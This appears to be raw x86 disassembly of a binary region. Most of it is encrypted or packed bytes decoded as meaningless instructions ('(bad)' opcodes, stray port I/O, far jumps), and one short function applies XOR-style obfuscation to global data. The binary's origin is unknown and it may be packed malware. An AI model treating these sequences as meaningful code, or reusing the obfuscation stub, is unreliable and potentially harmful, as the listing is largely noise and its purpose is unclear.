  4094bb:	push   edi
  4094bc:	pop    esp
  4094bd:	popa   
  4094be:	fs jne 0x409493
  4094c1:	loope  0x4094f9
  4094c3:	or     BYTE PTR [ebx+edi*1-0x45],dh
  4094c7:	in     eax,dx
  4094c8:	data16 xlat BYTE PTR ds:[ebx]
  4094ca:	mov    esi,0x87c708c
  4094cf:	adc    DWORD PTR [edx+0x6abb2e9c],eax
  4094d5:	fst    st(3)
  4094d7:	sbb    BYTE PTR [esi+ecx*8-0x1c],0xf8
  4094dc:	(bad)  
  4094dd:	aad    0x4b
  4094df:	pop    esi
  4094e0:	push   ss
  4094e1:	pop    ds
  4094e2:	cmp    dl,BYTE PTR [edx]
  4094e4:	fnsave ds:0xf6b4ed42
  4094ea:	push   esi
  4094eb:	loop   0x40954d
  4094ed:	(bad)  
  4094ee:	jle    0x4094ff
  4094f0:	xchg   edi,eax
  4094f1:	popa   
  4094f2:	add    cl,BYTE PTR [edi-0x736afd63]
  4094f8:	sbb    al,0xfa
  4094fa:	call   DWORD PTR [ecx]
  4094fc:	nop
  4094fd:	ins    DWORD PTR es:[edi],dx
  4094fe:	mov    al,0x25
  409500:	xchg   esi,eax
  409501:	mov    ds:0x9d76c08,eax
  409506:	sub    al,0x89
  409508:	adc    al,0x72
  40950a:	shr    BYTE PTR [eax-0x1cb33583],1
  409510:	lea    esi,[ecx-0x7d]
  409513:	stc    
  409514:	fld    DWORD PTR ds:0x23fbd53e
  40951a:	fistp  DWORD PTR [ecx+0x59693b8b]
  409520:	ja     0x409518
  409522:	fs gs xchg ecx,eax
  409525:	dec    edx
  409526:	xor    eax,0xf123e56a
  40952b:	jle    0x409586
  40952d:	adc    eax,DWORD PTR [ecx+0x26]
  409530:	mov    ecx,0x84ffa477
  409535:	add    bh,BYTE PTR [ebx]
  409537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409538:	out    dx,al
  409539:	adc    dh,BYTE PTR [ebx+edx*4+0x3c5f4dff]
  409540:	into   
  409541:	add    DWORD PTR [eax],ebp
  409543:	ins    BYTE PTR es:[edi],dx
  409544:	inc    ebp
  409545:	sbb    bh,BYTE PTR [esp+ecx*1]
  409548:	inc    edx
  409549:	call   0x6ec9518c
  40954e:	cmp    cl,bl
  409550:	xchg   esi,eax
  409551:	mov    eax,0x266a065a
  409556:	and    eax,0x4ce9ff54
  40955b:	adc    al,0x65
  40955d:	(bad)  
  40955e:	mov    bh,0x2e
  409560:	retf   
  409561:	mov    es,WORD PTR [edx]
  409563:	sub    al,0x9d
  409565:	add    BYTE PTR [esi+edi*4],al
  409568:	mov    eax,0x7e17d3d9
  40956d:	dec    edx
  40956e:	loope  0x4095b5
  409570:	(bad)  
  409571:	inc    esi
  409572:	jle    0x409516
  409574:	in     al,0x8e
  409576:	fdiv   QWORD PTR [edi-0x4f051917]
  40957c:	ins    DWORD PTR es:[edi],dx
  40957d:	adc    al,0x48
  40957f:	sub    ch,BYTE PTR [ebp+0x26917729]
  409585:	mov    dh,0x1
  409588:	and    al,BYTE PTR [edi+0x1064944b]
  40958e:	mov    edx,DWORD PTR [edx+0x51]
  409591:	and    eax,DWORD PTR [edi]
  409593:	popa   
  409594:	fwait
  409595:	(bad)  
  409596:	jo     0x409599
  409598:	push   ebx
  409599:	jle    0x4095d4
  40959b:	jnp    0x4095d0
  40959d:	dec    ebp
  40959e:	mov    al,0x9
  4095a0:	cmp    ecx,DWORD PTR [ecx]
  4095a2:	into   
  4095a3:	sbb    esi,DWORD PTR [edx-0x4a43145f]
  4095a9:	mov    ecx,0x95e85d23
  4095ae:	loopne 0x4095d6
  4095b0:	test   eax,0x8fc94431
  4095b5:	fild   DWORD PTR [edi+0x1f5916a4]
  4095bb:	mov    eax,ds:0xc7332b3c
  4095c0:	repnz (bad) 
  4095c2:	xor    ch,dl
  4095c4:	mov    ebx,0xa5f5b840
  4095c9:	rol    DWORD PTR [ebx-0x6e],1
  4095cc:	inc    esp
  4095cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095ce:	add    DWORD PTR [edx+0x137b8753],0x7cc72fa2
  4095d8:	int    0x4f
  4095da:	push   cs
  4095db:	(bad)  
  4095dc:	scas   eax,DWORD PTR es:[edi]
  4095dd:	rcl    BYTE PTR [ecx+esi*4],0x74
  4095e1:	inc    ecx
  4095e2:	xor    BYTE PTR [edx+0xe],cl
  4095e5:	push   ss
  4095e6:	fwait
  4095e7:	xchg   ebx,eax
  4095e8:	push   ss
  4095e9:	imul   al
  4095eb:	and    ch,dl
  4095ed:	(bad)  
  4095ee:	(bad)  
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8ec6:0x4ab7c14e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	xchg   edx,eax
  40960d:	rol    DWORD PTR [edi],1
  40960f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409610:	jne    0x40966c
  409612:	and    al,0xd6
  409614:	sbb    DWORD PTR [esi+ecx*8],esp
  409617:	out    0xbd,eax
  409619:	dec    ebx
  40961a:	pop    ss
  40961b:	shl    DWORD PTR [ebx-0x7c4ed8f],1
  409621:	stos   BYTE PTR es:[edi],al
  409622:	or     bh,BYTE PTR [edx+0x36]
  409625:	mov    al,ds:0xb28fe395
  40962a:	xor    DWORD PTR [esi-0x1e3aca9d],eax
  409630:	cdq    
  409631:	fs xor eax,0x7656278b
  409637:	gs sub eax,0x5b230124
  40963d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40963e:	sahf   
  40963f:	dec    ecx
  409640:	in     al,0xeb
  409642:	ins    DWORD PTR es:[edi],dx
  409643:	or     dh,bl
  409645:	dec    esi
  409646:	ds adc edi,0x13914a1c
  40964d:	cs jbe 0x4096bd
  409650:	lods   eax,DWORD PTR ds:[esi]
  409651:	fidiv  DWORD PTR [esi]
  409653:	jno    0x40969f
  409655:	iret   
  409656:	(bad)  
  409658:	leave  
  409659:	mov    ds:0xe57cb302,eax
  40965e:	and    eax,0xed96045a
  409663:	or     al,0x4
  409665:	inc    edi
  409666:	xor    DWORD PTR [ecx+eax*1-0x80],edi
  40966a:	sub    esp,DWORD PTR [ebx]
  40966c:	mov    ch,0xda
  40966e:	mov    ds:0xd9059fe,eax
  409673:	dec    ebx
  409674:	repz adc ebx,esp
  409677:	arpl   WORD PTR [edx-0x22],di
  40967a:	(bad)  
  40967b:	retf   
  40967c:	xchg   ebp,eax
  40967d:	dec    edi
  40967e:	mov    DWORD PTR [edi-0x36],ebx
  409681:	mov    edx,ebx
  409683:	out    0xa8,al
  409685:	out    0xc1,al
  409687:	xchg   esi,eax
  409688:	cmp    esi,DWORD PTR ds:0xc367105e
  40968e:	pop    es
  40968f:	and    ebx,DWORD PTR [ecx-0x53c1fe28]
  409695:	cmp    al,0xf5
  409697:	stos   DWORD PTR es:[edi],eax
  409698:	push   esp
  409699:	sub    ebp,DWORD PTR [edi]
  40969b:	ror    edx,1
  40969d:	sbb    BYTE PTR [ecx+0x29b036bd],0x85
  4096a4:	into   
  4096a5:	sub    eax,0x142b305b
  4096aa:	call   FWORD PTR [edx+0xec8177e]
  4096b0:	xor    al,0xda
  4096b2:	sub    eax,0x2255525e
  4096b7:	dec    esp
  4096b8:	aad    0x7d
  4096ba:	(bad)  
  4096bb:	mov    bh,0xb0
  4096bd:	or     ah,al
  4096bf:	lods   al,BYTE PTR ds:[esi]
  4096c0:	in     al,0x84
  4096c2:	mov    eax,0x20e04bff
  4096c7:	fisub  WORD PTR [ebx]
  4096c9:	icebp  
  4096ca:	imul   edx,DWORD PTR [ebp-0x74],0x41
  4096ce:	sub    al,0xcb
  4096d0:	sbb    eax,0xecf015d8
  4096d5:	aas    
  4096d6:	sar    DWORD PTR [edx],cl
  4096d8:	out    dx,eax
  4096d9:	dec    ebp
  4096da:	(bad)  
  4096db:	pop    ss
  4096dc:	add    BYTE PTR [edi+0x5a],bh
  4096df:	out    dx,al
  4096e0:	fisub  DWORD PTR [esi]
  4096e2:	mov    eax,0xe53e40aa
  4096e7:	cmp    DWORD PTR [edx],0xffffffd7
  4096ea:	out    dx,al
  4096eb:	loop   0x4096f7
  4096ed:	in     al,0xd9
  4096ef:	gs (bad) 
  4096f1:	outs   dx,DWORD PTR ds:[esi]
  4096f2:	dec    edx
  4096f3:	xchg   BYTE PTR [ebx-0x1b4386fe],al
  4096f9:	mov    ?,WORD PTR [edx+0x7c]
  4096fc:	(bad)  
  4096fd:	mov    eax,DWORD PTR [esi-0x14]
  409700:	pop    es
  409701:	or     al,0x6d
  409703:	gs xor eax,0xae87d515
  409709:	out    dx,al
  40970a:	mov    edx,0xff00939b
  40970f:	(bad)  
  409711:	sub    DWORD PTR [esi+ecx*2],edx
  409714:	jge    0x40970e
  409716:	rcl    edx,cl
  409718:	push   cs
  409719:	mov    DWORD PTR [edi],esi
  40971b:	jo     0x4096a4
  40971d:	pop    ss
  40971e:	gs jmp 0x4096fc
  409721:	jecxz  0x4096d1
  409723:	jnp    0x4096e8
  409725:	or     eax,0x93cd4d36
  40972a:	ds sahf 
  40972c:	cli    
  40972d:	push   esp
  40972e:	call   0x267c:0x1557a92b
  409735:	lods   al,BYTE PTR ds:[esi]
  409736:	test   DWORD PTR [ebx+0x6eb86cf0],ebx
  40973c:	push   ds
  40973d:	sbb    ch,BYTE PTR [ebx]
  40973f:	(bad)  
  409740:	pop    esp
  409741:	mov    dl,BYTE PTR [esi+0x1ce21964]
  409747:	push   0x2
  409749:	push   ebx
  40974a:	and    BYTE PTR [ebp-0x24ac135e],ah
  409750:	xchg   ebp,eax
  409751:	mov    dl,0x81
  409753:	stos   BYTE PTR es:[edi],al
  409754:	and    DWORD PTR [edx-0x6227394a],edx
  40975a:	jns    0x4096dc
  40975c:	pop    esp
  40975d:	push   cs
  40975e:	mov    eax,ds:0x1057326
  409763:	in     al,0x62
  409765:	jbe    0x409750
  409767:	sbb    edi,esi
  409769:	sbb    bl,dh
  40976b:	cmc    
  40976c:	or     DWORD PTR [edi-0x61],eax
  40976f:	nop    edx
  409772:	mov    DWORD PTR [edi+0x2300b68c],0x2c6124d4
  40977c:	scas   eax,DWORD PTR es:[edi]
  40977d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40977e:	and    BYTE PTR [edi],dl
  409780:	adc    BYTE PTR [ecx],dh
  409782:	inc    eax
  409783:	fwait
  409784:	iret   
  409785:	std    
  409786:	test   eax,0x39a54627
  40978b:	cs clc 
  40978d:	push   edx
  40978e:	jmp    0xede3ab53
  409793:	mov    bh,0x8f
  409795:	or     eax,0x3ca74c
  40979a:	xchg   ecx,eax
  40979b:	call   0x727c:0xf0d8ac3
  4097a2:	push   edx
  4097a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097a4:	push   es
  4097a5:	dec    esp
  4097a6:	into   
  4097a7:	jo     0x409769
  4097a9:	repnz scas al,BYTE PTR es:[edi]
  4097ab:	and    ebx,ecx
  4097ad:	rcl    DWORD PTR ds:0x36e6c3d0,cl
  4097b3:	out    0x2f,al
  4097b5:	sub    ah,BYTE PTR [eax]
  4097b7:	inc    edx
  4097b8:	je     0x4097e6
  4097ba:	out    dx,al
  4097bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097bc:	cmp    eax,0x954d08c4
  4097c1:	mov    edx,0xf443aa85
  4097c6:	or     al,0xd8
  4097c8:	in     al,dx
  4097c9:	stos   DWORD PTR es:[edi],eax
  4097ca:	mov    edx,0xf6960134
  4097cf:	mov    dl,0x84
  4097d1:	mov    eax,ds:0x5e2023fe
  4097d6:	out    dx,eax
  4097d7:	call   0xee5b:0xec5982d
  4097de:	(bad)  
  4097df:	xlat   BYTE PTR ds:[ebx]
  4097e0:	jae    0x40985d
  4097e2:	out    0xcf,eax
  4097e4:	out    0x61,al
  4097e6:	(bad)  
  4097e7:	mov    ebx,0x65ab8f29
  4097ec:	xor    al,0x98
  4097ee:	in     al,0x38
  4097f0:	adc    DWORD PTR [edx-0x31e45e53],ecx
  4097f6:	mov    esp,0x729ceabf
  4097fb:	enterw 0x23c1,0x71
  409800:	jmp    0x409812
  409802:	jb     0x40987b
  409804:	aaa    
  409805:	cmp    ecx,DWORD PTR [eax+0x65]
  409808:	sbb    eax,0x58b6f28b
  40980d:	mov    DWORD PTR [ebx+0x16c52918],ebp
  409813:	(bad)  
  409814:	push   ebp
  409815:	jno    0x4097e6
  409817:	mov    al,0xc1
  40981a:	ret    
  40981b:	test   DWORD PTR [edx+esi*2-0x6436ed31],0x853984f7
  409826:	ins    BYTE PTR es:[edi],dx
  409827:	cmp    al,ch
  409829:	and    eax,0x16db196a
  40982e:	shr    DWORD PTR [eax-0xd],cl
  409831:	das    
  409832:	mov    eax,0x8b14f975
  409837:	inc    ebp
  409838:	hlt    
  409839:	cmp    eax,ebx
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x43375f
  40986f:	xor    DWORD PTR ds:0x433697,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x43375b,0x43372b
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x4336e7,0x433793
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x43367b
  4098a6:	sub    DWORD PTR ds:0x43375f,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	(bad)  [ebx+0x7d]
  4098c3:	(bad)  
  4098c4:	mov    ah,0xd9
  4098c6:	jle    0x409946
  4098c8:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  4098cc:	mov    eax,ds:0x10d1f4ba
  4098d1:	sahf   
  4098d2:	mov    dl,0x83
  4098d4:	jne    0x4098a6
  4098d6:	mov    bh,BYTE PTR [eax-0x2a]
  4098d9:	call   0x4d03a7d4
  4098de:	nop
  4098df:	or     eax,0x56978a73
  4098e4:	fistp  WORD PTR [ebp+0x622f3cd1]
  4098ea:	mov    ebp,0x98bd0ba7
  4098ef:	scas   eax,DWORD PTR es:[edi]
  4098f0:	jg     0x4098d4
  4098f2:	push   cs
  4098f3:	(bad)  
  4098f4:	add    eax,0xdc223917
  4098f9:	and    al,0xd8
  4098fb:	push   ebx
  4098fc:	pop    ebp
  4098fd:	adc    eax,0x4dd66f08
  409902:	rcl    DWORD PTR [ecx-0x6a],cl
  409905:	imul   ebp,DWORD PTR [edi],0x35
  409908:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409909:	clc    
  40990a:	into   
  40990b:	(bad)  
  40990c:	imul   esp,DWORD PTR [ecx-0x7c641229],0x27
  409913:	sbb    eax,0xab993fff
  409918:	leave  
  409919:	mov    BYTE PTR [edi-0x1c],dh
  40991c:	or     eax,0xc1b7396
  409921:	cmp    al,0xf2
  409923:	jecxz  0x409990
  409925:	xchg   ecx,eax
  409926:	scas   eax,DWORD PTR es:[edi]
  409927:	retf   0xe792
  40992a:	and    DWORD PTR ds:0x6f057d66,0xc2506a4e
  409934:	loop   0x40997f
  409936:	int3   
  409937:	mov    dl,0xcc
  409939:	cmc    
  40993a:	inc    ebp
  40993b:	xor    DWORD PTR [ebp+edx*2-0x3e],ebp
  40993f:	cs jmp 0x6a8:0x15ae33b6
  409947:	pusha  
  409948:	int    0x80
  40994a:	mov    ds:0x678dabd6,al
  40994f:	leave  
  409950:	adc    ebx,edi
  409952:	adc    esp,DWORD PTR [ecx-0x1ae98fc7]
  409958:	mov    bh,0xda
  40995a:	add    al,0x1
  40995c:	jo     0x4099ae
  40995e:	mov    edx,0x4b75f0f2
  409963:	mov    ds:0x756065d5,al
  409968:	mov    ah,ch
  40996a:	scas   eax,DWORD PTR es:[edi]
  40996b:	shr    DWORD PTR [edi+esi*4-0x5d],1
  40996f:	dec    edx
  409970:	std    
  409971:	repz (bad) 
  409973:	jns    0x40990b
  409975:	rcl    dh,0xd4
  409978:	rol    BYTE PTR [edx-0x5fd52fc2],cl
  40997e:	xor    BYTE PTR [ebp+0x714a499e],al
  409984:	inc    eax
  409985:	sti    
  409986:	inc    edi
  409987:	and    dl,BYTE PTR [esp+esi*2-0x1711d2a8]
  40998e:	xlat   BYTE PTR ds:[ebx]
  40998f:	fild   DWORD PTR [edi+0x5]
  409992:	mov    bh,0x4a
  409994:	sbb    al,0x4c
  409996:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409997:	sub    eax,0x67a72d6b
  40999c:	or     BYTE PTR [ecx-0x8],ah
  40999f:	(bad)  
  4099a0:	iret   
  4099a1:	mov    eax,ds:0xb09223b0
  4099a6:	push   eax
  4099a7:	loopne 0x40994e
  4099a9:	push   ebp
  4099aa:	xchg   ebx,eax
  4099ab:	enter  0x61cf,0x59
  4099af:	jmp    0xdd99:0x39cee223
  4099b6:	and    edx,DWORD PTR [ecx]
  4099b8:	inc    ebp
  4099b9:	nop
  4099ba:	and    edi,0x9
  4099bd:	jb     0x4099ae
  4099bf:	leave  
  4099c0:	jb     0x409948
  4099c2:	and    edx,ebx
  4099c4:	or     BYTE PTR [edx],ch
  4099c6:	mov    eax,esp
  4099c8:	mov    ebp,0xb0f39db4
  4099cd:	test   eax,0x3814c67e
  4099d2:	sub    DWORD PTR [ebx+edx*1-0x703377c9],edi
  4099d9:	fimul  WORD PTR [ecx-0x4f]
  4099dc:	dec    esi
  4099dd:	mov    ebx,0xe7358337
  4099e2:	cld    
  4099e3:	test   BYTE PTR gs:[esi],dl
  4099e6:	mul    BYTE PTR [ebx-0x6a0ef420]
  4099ec:	pop    ds
  4099ed:	push   ecx
  4099ee:	jge    0x409a07
  4099f0:	dec    edx
  4099f1:	adc    DWORD PTR [esi+edi*1-0xe],esi
  4099f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099f6:	out    0x85,al
  4099f8:	sub    DWORD PTR [edi],0xc4b411d5
  4099fe:	sti    
  4099ff:	or     ah,cl
  409a01:	xor    BYTE PTR [edx],bh
  409a03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a04:	mov    ebp,0x689bd47f
  409a09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a0a:	dec    eax
  409a0b:	popa   
  409a0c:	dec    ebx
  409a0d:	shr    DWORD PTR [eax],1
  409a0f:	rcr    BYTE PTR [esi+0x518e4742],0xe9
  409a16:	repnz aas 
  409a18:	mov    dl,0x92
  409a1a:	xchg   ebp,eax
  409a1b:	sub    ecx,ecx
  409a1d:	enter  0x1cec,0x44
  409a21:	scas   eax,DWORD PTR es:[edi]
  409a22:	jae    0x409a1f
  409a24:	add    al,0x37
  409a26:	test   eax,esi
  409a28:	aaa    
  409a29:	dec    sp
  409a2b:	pop    edi
  409a2c:	(bad)  
  409a2d:	adc    BYTE PTR [ebx-0x755f8c05],dh
  409a33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a34:	mov    ?,WORD PTR [eax]
  409a36:	in     al,0x5e
  409a38:	jmp    0x4099bf
  409a3a:	adc    edi,DWORD PTR [esi-0x4dbc165e]
  409a40:	stos   BYTE PTR es:[edi],al
  409a41:	js     0x4099d1
  409a43:	push   ecx
  409a44:	xchg   edi,eax
  409a45:	jg     0x4099d9
  409a47:	dec    edx
  409a48:	daa    
  409a49:	enter  0x92c4,0x51
  409a4d:	out    0x83,eax
  409a4f:	shl    BYTE PTR [edi-0xdbd74f2],1
  409a55:	in     eax,0xb1
  409a57:	daa    
  409a58:	stos   BYTE PTR es:[edi],al
  409a59:	shl    BYTE PTR [ecx-0x57ef950e],1
  409a5f:	sahf   
  409a60:	fmul   QWORD PTR [ecx+0x48]
  409a63:	ins    DWORD PTR es:[edi],dx
  409a64:	mov    ch,0x15
  409a66:	mov    esi,0xf29444b7
  409a6b:	dec    DWORD PTR [ebx+esi*4+0x4e]
  409a6f:	test   BYTE PTR [ebx-0x80],cl
  409a72:	es jp  0x409a7e
  409a75:	cmp    BYTE PTR [ebx+esi*4+0x4c],bl
  409a79:	mov    esp,0xb4935efa
  409a7e:	jp     0x409af1
  409a80:	dec    edi
  409a81:	rcl    DWORD PTR [ebp+0x4c458d23],0xee
  409a88:	(bad)  
  409a89:	pop    ecx
  409a8a:	fcom   QWORD PTR [eax-0x1e03e166]
  409a90:	outs   dx,DWORD PTR ds:[esi]
  409a91:	pop    es
  409a92:	jge    0x409aef
  409a94:	retf   
  409a95:	jno    0x409a4a
  409a97:	clc    
  409a98:	mov    al,ds:0xbe7c2691
  409a9d:	mov    DWORD PTR [eax+0x5],0x56147864
  409aa4:	popa   
  409aa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409aa6:	ds jno 0x409a74
  409aa9:	xchg   ecx,eax
  409aaa:	test   al,0x7
  409aac:	loopne 0x409af7
  409aae:	imul   ebx,edx,0x4992d763
  409ab4:	mov    cl,0x9d
  409ab6:	dec    ebx
  409ab7:	scas   al,BYTE PTR es:[edi]
  409ab8:	daa    
  409ab9:	retf   0xa86d
  409abc:	pop    esp
  409abd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409abe:	ret    
  409abf:	sahf   
  409ac0:	mov    esi,0x7ee5874e
  409ac5:	dec    edx
  409ac6:	dec    eax
  409ac7:	mov    eax,0xf00dd919
  409acc:	inc    ebx
  409acd:	loope  0x409b2d
  409acf:	cmp    eax,0x8c7c9622
  409ad4:	retf   
  409ad5:	mov    edx,0x7968397b
  409ada:	push   esp
  409adb:	mov    bh,0x33
  409add:	call   FWORD PTR [edx-0x39]
  409ae0:	mov    edi,gs
  409ae2:	stos   DWORD PTR es:[edi],eax
  409ae3:	sub    ah,0x8d
  409ae6:	sbb    eax,DWORD PTR [ebx]
  409ae8:	cmp    al,0x5c
  409aea:	and    al,0x74
  409aec:	fidivr WORD PTR [ebp-0x67]
  409aef:	cmp    esi,DWORD PTR [esi-0x3bf3b9fe]
  409af5:	pop    es
  409af6:	push   0xffffff91
  409af8:	arpl   WORD PTR [ecx-0x215b0c4e],cx
  409afe:	test   DWORD PTR [ebp+0x6e3cceee],edx
  409b04:	mov    al,0x0
  409b06:	mov    edi,0x3c4853f1
  409b0b:	loopne 0x409aa8
  409b0d:	nop
  409b0e:	dec    DWORD PTR [ecx+0x65]
  409b11:	fist   DWORD PTR [esi+0x57]
  409b14:	sbb    DWORD PTR ds:0x43371f,0x4336d3
  409b1e:	jmp    0x409d81
  409b23:	lds    esp,FWORD PTR [edi-0x2e932d54]
  409b29:	popa   
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi+0x3acd56d4]
  409b32:	(bad)  
  409b33:	jle    0x409b19
  409b35:	jle    0x409bb5
  409b37:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409b3b:	jns    0x409b5c
  409b3d:	and    DWORD PTR [edx-0x7d],ebp
  409b40:	jns    0x409b07
  409b42:	add    al,0x1c
  409b44:	adc    al,0xb1
  409b46:	aam    0x6
  409b48:	addr16 xchg ebp,eax
  409b4a:	xor    al,0xba
  409b4c:	stos   BYTE PTR es:[edi],al
  409b4d:	sbb    BYTE PTR [edx],dl
  409b4f:	arpl   WORD PTR [ebx],sp
  409b51:	xchg   ebp,eax
  409b52:	inc    ecx
  409b53:	mov    al,0xd3
  409b55:	dec    edx
  409b56:	fdivr  DWORD PTR [eax+0x6536d965]
  409b5c:	sub    al,0xae
  409b5e:	leave  
  409b5f:	(bad)  
  409b60:	sti    
  409b61:	inc    ebx
  409b62:	mov    eax,ds:0x6e02afac
  409b67:	xchg   edx,eax
  409b68:	out    0x8a,eax
  409b6a:	addr16 popa 
  409b6c:	fldenv ds:0xd9c7b4ee
  409b72:	addr16 push ds
  409b74:	sbb    dh,BYTE PTR [eax-0x55f9c4ef]
  409b7a:	mov    ah,0xa
  409b7c:	sbb    bl,bl
  409b7e:	(bad)  
  409b7f:	iret   
  409b80:	sub    eax,0xa503941b
  409b85:	xor    al,0x84
  409b87:	xor    DWORD PTR [ebp-0x3b],esp
  409b8a:	push   esi
  409b8b:	jo     0x409b8d
  409b8d:	sbb    DWORD PTR [ebp+ecx*1-0x67c97ce6],esi
  409b94:	addr16 push esi
  409b96:	push   ebx
  409b97:	rcl    BYTE PTR [esi],cl
  409b99:	fsub   DWORD PTR [ebx]
  409b9b:	cmp    al,0x1b
  409b9d:	cwde   
  409b9e:	mov    ebx,0x3d7a67b9
  409ba3:	jb     0x409b47
  409ba5:	push   cs
  409ba6:	popf   
  409ba7:	not    DWORD PTR [ecx-0x5d]
  409baa:	cmp    ebp,DWORD PTR [esi+0x20]
  409bad:	cwde   
  409bae:	je     0x409bf5
  409bb0:	ficomp WORD PTR [ecx-0x79]
  409bb3:	adc    cl,BYTE PTR [ebx-0x12d0b45d]
  409bb9:	sub    DWORD PTR [eax],ebp
  409bbb:	mov    ebx,0x7fa00f0b
  409bc0:	jno    0x409ba6
  409bc2:	ss adc eax,0x5901908
  409bc8:	push   0x1f742d59
  409bcd:	(bad)  
  409bce:	mov    edi,0xe091a901
  409bd3:	mov    bl,0xb5
  409bd5:	jmp    0x409bf8
  409bd7:	dec    ebp
  409bd8:	(bad)  
  409bd9:	outs   dx,DWORD PTR ds:[esi]
  409bda:	hlt    
  409bdb:	or     ch,bl
  409bdd:	add    BYTE PTR [edx+0x31],ch
  409be0:	mov    ds:0x3480386c,eax
  409be5:	mov    ah,0xb7
  409be7:	xor    BYTE PTR [eax],al
  409be9:	mov    cl,0x66
  409beb:	xor    sp,WORD PTR [edi]
  409bee:	(bad)  
  409bef:	jge    0x409b9d
  409bf1:	pop    esi
  409bf2:	mov    WORD PTR [esi-0xa],cs
  409bf5:	cld    
  409bf6:	icebp  
  409bf7:	das    
  409bf8:	loopne 0x409c02
  409bfa:	jno    0x409c3c
  409bfc:	fdiv   QWORD PTR [edi+esi*1-0x46b37f21]
  409c03:	mov    ecx,0x7200ef47
  409c08:	lods   eax,DWORD PTR ds:[esi]
  409c09:	jnp    0x409bac
  409c0b:	inc    esi
  409c0c:	sbb    DWORD PTR [eax+0x2576655a],ebp
  409c12:	arpl   WORD PTR [ecx+0x6b901ace],cx
  409c18:	or     DWORD PTR [edi+ebx*4],eax
  409c1b:	push   esp
  409c1c:	cmp    ch,ch
  409c1e:	lahf   
  409c1f:	push   esp
  409c20:	jno    0x409c0a
  409c22:	pusha  
  409c23:	jnp    0x409baf
  409c25:	les    ebp,FWORD PTR [esi+ecx*4-0x5017dbc5]
  409c2c:	arpl   WORD PTR [ecx],dx
  409c2e:	push   es
  409c2f:	mov    esi,0xce0706f
  409c34:	dec    ecx
  409c35:	xor    ch,bl
  409c37:	inc    edi
  409c38:	stc    
  409c39:	jne    0x409c0e
  409c3b:	cmc    
  409c3c:	shl    dl,0xa6
  409c3f:	imul   ebp,DWORD PTR [edi+0x12],0xa1074910
  409c46:	(bad)  
  409c47:	cmc    
  409c48:	mov    ebx,0xd9b65391
  409c4d:	not    DWORD PTR [ebx+0x7296604b]
  409c53:	cmp    eax,0xfc8cbb62
  409c58:	push   eax
  409c59:	in     eax,dx
  409c5a:	into   
  409c5b:	call   0xab73e663
  409c60:	shl    BYTE PTR [edx-0x75],1
  409c63:	add    al,BYTE PTR ds:0x899bc820
  409c69:	icebp  
  409c6a:	nop
  409c6b:	and    al,0xff
  409c6d:	cwde   
  409c6e:	or     eax,0x12196fd
  409c73:	or     ebp,ecx
  409c75:	cli    
  409c76:	mov    bh,BYTE PTR [eax-0x7a4a05d1]
  409c7c:	sub    BYTE PTR [eax+0x3e],bh
  409c7f:	adc    BYTE PTR [edx],cl
  409c81:	push   0x419bc269
  409c86:	sub    edi,DWORD PTR [ebx]
  409c88:	xchg   ecx,eax
  409c89:	xor    al,0x63
  409c8b:	xchg   ecx,eax
  409c8c:	inc    edx
  409c8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c8e:	dec    edi
  409c8f:	push   0x31
  409c91:	jnp    0x409caa
  409c93:	dec    esp
  409c94:	lahf   
  409c95:	add    BYTE PTR [edi],0xf1
  409c98:	mov    cl,0x83
  409c9a:	cmp    BYTE PTR [ebp-0x6be384b8],dh
  409ca0:	inc    ebp
  409ca1:	push   ss
  409ca2:	imul   ebx,DWORD PTR [ebp+0x44],0xb1b1444
  409ca9:	add    esi,DWORD PTR [edx-0x40]
  409cac:	push   0x47
  409cae:	popf   
  409caf:	cwde   
  409cb0:	dec    ecx
  409cb1:	xchg   ebp,eax
  409cb2:	and    eax,0xafcea1c2
  409cb7:	popf   
  409cb8:	in     al,dx
  409cb9:	fild   WORD PTR [esi]
  409cbb:	xchg   ecx,eax
  409cbc:	dec    edx
  409cbd:	int    0xeb
